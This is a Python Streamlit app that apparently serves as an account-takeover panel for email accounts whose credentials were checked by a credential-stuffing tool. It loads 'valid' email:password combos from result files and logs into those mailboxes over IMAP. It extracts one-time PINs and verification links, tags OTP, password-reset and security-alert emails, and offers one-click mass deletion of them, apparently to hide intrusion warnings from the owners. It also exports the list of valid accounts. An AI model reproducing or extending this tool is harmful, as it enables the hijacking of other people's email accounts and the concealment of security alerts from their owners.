 import glob
import imaplib
import os
import re
import time
from email import message_from_bytes
from email.header import decode_header

import streamlit as st

# ------------------------------------------------------------------
# 1️⃣ Imports – keep the original imports
# ------------------------------------------------------------------
from hosts import host_list  # optional – fall back to hard‑coded list if missing

# ------------------------------------------------------------------
# 2️⃣ Streamlit layout
# ------------------------------------------------------------------
st.set_page_config(page_title="Mailbox", page_icon="📥", layout="wide")

# ------------------------------------------------------------------
# 3️⃣ Session state helpers
# ------------------------------------------------------------------
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""

def log(msg: str) -> None:
    """Insert a new log entry at the top of the list."""
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:20]

# ------------------------------------------------------------------
# 4️⃣ Load valid accounts
# ------------------------------------------------------------------
def load_valid() -> list[str]:
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email, pwd = line.split(":", 1)
                    combo = f"{email.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows

# ------------------------------------------------------------------
# 5️⃣ Header decoding helper
# ------------------------------------------------------------------
def decode_hdr(value: str) -> str:
    try:
        parts = decode_header(value or "")
        return "".join(
            part.decode(charset or "utf-8", errors="ignore")
            if isinstance(part, bytes)
            else part
            for part, charset in parts
        )
    except Exception:
        return str(value or "")

# ------------------------------------------------------------------
# 6️⃣ **Original folder discovery logic – keep it unchanged!**
# ------------------------------------------------------------------
def list_folders(mail: imaplib.IMAP4_SSL) -> list[str]:
    """
    Return a sorted list of folder names discovered via
    `mail.list('""','*')`.  Falls back to ["INBOX"] if nothing is found.
    """
    found = set()
    try:
        typ, data = mail.list('""', "*")
        if typ == "OK" and data:
            for item in data:
                if not item:
                    continue
                s = item.decode("utf-8", errors="ignore") if isinstance(item, bytes) else str(item)
                quoted = re.findall(r'"((?:\\.|[^"\\])*)"', s)
                name = quoted[-1] if quoted else s.split()[-1]
                name = name.replace('\\"', '"').strip()
                if name and name not in (".", "/"):
                    found.add(name)
    except Exception:
        pass
    if not found:
        found.add("INBOX")
    return sorted(found, key=lambda x: (0 if x.lower() == "inbox" else 1, x.lower()))

# ------------------------------------------------------------------
# 7️⃣ IMAP helpers
# ------------------------------------------------------------------
def open_mail(email: str, password: str, host: str) -> imaplib.IMAP4_SSL:
    mail = imaplib.IMAP4_SSL(host, 993, timeout=20)
    mail.login(email, password)
    return mail

def close_mail(mail: imaplib.IMAP4_SSL) -> None:
    try:
        mail.logout()
    except Exception:
        try:
            mail.shutdown()
        except Exception:
            pass

# ------------------------------------------------------------------
# 8️⃣ Connection helper
# ------------------------------------------------------------------
def connect_first(email: str, password: str, override: str) -> tuple[str, list[str], str | None]:
    hosts = [override] if override else host_list(email)
    last = "no host"
    for host in hosts:
        mail = None
        try:
            mail = open_mail(email, password, host)
            folders = list_folders(mail)
            close_mail(mail)
            return host, folders, None
        except Exception as e:
            last = f"{host}: {e}"
            if mail:
                close_mail(mail)
    return "", ["INBOX"], last

# ------------------------------------------------------------------
# 9️⃣ Auxiliary helpers – webmail portal, bot detection, PIN/links, cleanup
# ------------------------------------------------------------------
def get_webmail_portal(email: str) -> str:
    if "@" not in email:
        return "https://mail.google.com"
    domain = email.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me",
    }
    return portals.get(domain, f"https://www.{domain}")

def is_bot_message(subject: str, body: str) -> bool:
    """Return True if the message looks like an OTP / bot / verification email."""
    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin",
        "crypto", "token", "activation", "alert", "transaction",
    ]
    combined = f"{subject} {body}".lower()
    return any(kw in combined for kw in bot_keywords)

def extract_pins_and_links(text: str) -> tuple[list[str], list[str]]:
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))

def clean_boilerplate(text: str) -> str:
    if not text:
        return ""
    patterns = [
        r"(?i)unsubscribe.*?(?:\n|$)",
        r"(?i)privacy policy.*?(?:\n|$)",
        r"(?i)confidentiality notice.*?(?:\n\n|$)",
        r"(?i)this email was sent by.*?(?:\n|$)",
    ]
    for pat in patterns:
        text = re.sub(pat, "", text)
    return text.strip()

# ------------------------------------------------------------------
# 10️⃣ Streamlit UI – Sidebar
# ------------------------------------------------------------------
st.title("Mailbox")
st.caption("Reconnects on every click. Socket is not kept in session.")

valid = load_valid()
st.sidebar.header("Account")
pick = st.sidebar.selectbox("Valid account", valid or ["none"])
custom_email = st.sidebar.text_input("Email override")
custom_pass = st.sidebar.text_input("Password override", type="password")
override = st.sidebar.text_input("IMAP host override")

if custom_email.strip():
    email, password = custom_email.strip(), custom_pass.strip()
elif ":" in pick:
    email, password = pick.split(":", 1)
else:
    email, password = "", ""

st.sidebar.write("Host order: " + ", ".join(host_list(email)[:4]) if email else "-")

if st.sidebar.button("Load folders", type="primary"):
    if not email or not password:
        st.error("Need email and password")
    else:
        with st.spinner("Connecting..."):
            host, folders, err = connect_first(email, password, override.strip())
        if err:
            st.error(err)
            log(err)
        else:
            st.session_state.mb_host = host
            st.session_state.mb_folders = folders
            log(f"folders {len(folders)} via {host}")
            st.success(f"{host} · {len(folders)} folders")

# ------------------------------------------------------------------
# 11️⃣ Main panel – Folder selector and message loading
# ------------------------------------------------------------------
folder = st.selectbox("Folder", st.session_state.mb_folders)
page_size = st.slider("Page size", 5, 40, 15)

if st.button("Load messages"):
    host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("Load folders first")
    else:
        mail = None
        try:
            with st.spinner(f"Reading {folder} on {host}"):
                mail = open_mail(email, password, host)
                # select readonly to avoid altering flags during the read
                mail.select(f'"{folder}"', readonly=True)

                # search
                typ, data = mail.search(None, "ALL")
                ids = (data[0] or b"").split() if typ == "OK" else []

                # order & slice
                ids = list(reversed(ids))[:page_size]

                rows = []
                for mid in ids:
                    # fetch full RFC822 to get body later
                    typ, msgdata = mail.fetch(mid, "(RFC822)")
                    if typ != "OK" or not msgdata or not isinstance(msgdata[0], tuple):
                        continue
                    raw_bytes = msgdata[0][1]
                    msg_obj = message_from_bytes(raw_bytes)

                    subject = decode_hdr(msg_obj.get("Subject", ""))
                    frm = decode_hdr(msg_obj.get("From", ""))
                    date_val = decode_hdr(msg_obj.get("Date", ""))
                    is_read = "\\Seen" in msg_obj.get_flags() if hasattr(msg_obj, "get_flags") else False

                    # Body extraction
                    body_text = ""
                    if msg_obj.is_multipart():
                        for part in msg_obj.walk():
                            if part.get_content_type() == "text/plain":
                                try:
                                    body_text = part.get_payload(decode=True).decode(
                                        part.get_content_charset() or "utf-8", errors="ignore"
                                    )
                                    break
                                except Exception:
                                    pass
                    else:
                        try:
                            body_text = msg_obj.get_payload(decode=True).decode(
                                msg_obj.get_content_charset() or "utf-8", errors="ignore"
                            )
                        except Exception:
                            pass

                    cleaned_body = clean_boilerplate(body_text)
                    pins, links = extract_pins_and_links(body_text)
                    is_bot = is_bot_message(subject, body_text)

                    rows.append(
                        {
                            "id": mid.decode(),
                            "from": frm,
                            "subject": subject,
                            "date": date_val,
                            "is_read": is_read,
                            "is_bot": is_bot,
                            "body": cleaned_body,
                            "pins": pins,
                            "links": links,
                            "raw": raw_bytes,
                        }
                    )

                st.session_state.current_messages = rows
                log(f"listed {len(rows)} in {folder}")
                st.success(f"Loaded {len(rows)} messages")
        except Exception as e:
            st.error(str(e))
            log(str(e))
        finally:
            if mail:
                close_mail(mail)

# ------------------------------------------------------------------
# 12️⃣ Message actions & UI
# ------------------------------------------------------------------
if st.session_state.get("current_messages"):
    bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    if bot_msgs:
        st.markdown("---")
        st.subheader(f"🤖 Bot & Security Intelligence Detected ({len(bot_msgs)} messages)")
        if st.button("🗑️ Mass Delete All Detected Bot/Spam Messages"):
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            try:
                mail = open_mail(email, password, host)
                mail.select(f'"{folder}"', readonly=False)
                for bm in bot_msgs:
                    mail.store(bm["id"], "+FLAGS", "\\Deleted")
                mail.expunge()
                mail.logout()
                st.success(f"Deleted {len(bot_msgs)} bot messages!")
                log(f"Mass deleted {len(bot_msgs)} bot messages from {folder}")
                st.rerun()
            except Exception as exc:
                st.error(f"Error during mass delete: {exc}")

    st.markdown("---")
    st.subheader(f"✉️ Message Stream ({len(st.session_state.current_messages)} loaded)")
    for msg in st.session_state.current_messages:
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP]" if msg["is_bot"] else ""
        with st.expander(f"{status_icon} [{msg['date']}] {msg['from']} – {msg['subject']}{bot_badge}"):
            st.write(f"**From:** {msg['from']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")

            if msg["pins"]:
                st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")

            if msg["links"]:
                st.markdown("🔗 **Actionable Verification Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

            st.markdown("---")
            st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['id']}")

            # Per‑message actions
            col1, col2, col3, col4 = st.columns(4)
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]

            with col1:
                if not msg["is_read"]:
                    if st.button("Mark as Read", key=f"read_{msg['id']}"):
                        try:
                            m = open_mail(email, password, host)
                            m.select(f'"{folder}"', readonly=False)
                            m.store(msg["id"], "+FLAGS", "\\Seen")
                            m.logout()
                            st.success("Marked as read!")
                            st.rerun()
                        except Exception as exc:
                            st.error(str(exc))

            with col2:
                target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['id']}")
                if st.button("Move Message", key=f"mv_btn_{msg['id']}"):
                    try:
                        m = open_mail(email, password, host)
                        m.select(f'"{folder}"', readonly=False)
                        m.copy(msg["id"], f'"{target_move}"')
                        m.store(msg["id"], "+FLAGS", "\\Deleted")
                        m.expunge()
                        m.logout()
                        st.success(f"Moved to {target_move}!")
                        st.rerun()
                    except Exception as exc:
                        st.error(str(exc))

            with col3:
                if st.button("Delete Message", key=f"del_{msg['id']}"):
                    try:
                        m = open_mail(email, password, host)
                        m.select(f'"{folder}"', readonly=False)
                        m.store(msg["id"], "+FLAGS", "\\Deleted")
                        m.expunge()
                        m.logout()
                        st.success("Deleted message!")
                        st.rerun()
                    except Exception as exc:
                        st.error(str(exc))

            with col4:
                with st.popover("View Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore"))

# ------------------------------------------------------------------
# 13️⃣ Sidebar – activity log & export of valid accounts
# ------------------------------------------------------------------
st.sidebar.markdown("---")
st.sidebar.subheader("📜 Live Activity Log")
with st.sidebar.expander("View activity log", expanded=False):
    for line in st.session_state.mb_log:
        st.text(line)

if valid:
    st.sidebar.markdown("---")
    st.sidebar.subheader("💾 Export Valid Accounts")
    export_text = "\n".join(valid)
    st.sidebar.download_button(
        label="Download valid_accounts_export.txt",
        data=export_text,
        file_name="valid_accounts_export.txt",
        mime="text/plain",
    )
